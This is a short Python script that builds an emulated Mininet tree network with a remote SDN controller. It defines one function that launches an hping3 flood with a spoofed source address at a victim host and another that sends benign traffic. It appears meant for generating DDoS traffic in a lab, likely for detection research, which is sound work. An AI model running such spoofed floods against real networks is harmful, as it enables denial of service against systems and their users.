from socket import timeout

# from sympy import hn1
from mininet.net import Mininet
from mininet.topolib import TreeTopo
from mininet.node import Controller, RemoteController,OVSSwitch
import threading

tree_topo = TreeTopo(depth=3, fanout=2)
net = Mininet(topo=tree_topo, controller=RemoteController,switch=OVSSwitch)
net.start()

def ddos_flood(host, timeout, spoofed_ip, victim_host_ip):
    # Attack the last host with IP 10.0.0.4
    # timout command is used to abort the hping3 command after the attack was performed for the specifed time
    host.cmd('timeout ' + str(timeout) + 's hping3 --flood ' + ' -a '+ spoofed_ip +' '+ victim_host_ip)
    host.cmd('killall hping3')


def ddos_benign(host, timeout, victim_host_ip):
    # Send benign packets to victim
    host.cmd('timeout ' + str(timeout) + 's hping3 ' + victim_host_ip)
    host.cmd('killall hping3')

# benign_host = h1
# attacking_host = h2

# t1 = threading.Thread(target=ddos_benign, args=(benign_host,))
# t2 = threading.Thread(target=ddos_flood, args=(attacking_host,)) 
 
# t1.start()
# t2.start()
    
# t1.join()
# t2.join()


# net.stop() 